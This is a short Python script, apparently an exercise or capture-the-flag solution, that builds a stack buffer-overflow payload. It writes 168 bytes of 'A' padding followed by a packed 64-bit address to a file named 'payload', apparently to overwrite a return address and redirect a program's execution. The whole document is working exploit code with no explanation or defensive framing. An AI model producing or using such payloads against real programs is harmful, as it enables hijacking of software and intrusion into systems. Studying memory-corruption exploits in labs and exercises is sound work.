import struct

offset = 168 
padding = b"A" * offset


target_address = struct.pack("<Q", 0x00000000000104e8) 

payload = padding + target_address

with open("payload", "wb") as f:
    f.write(payload)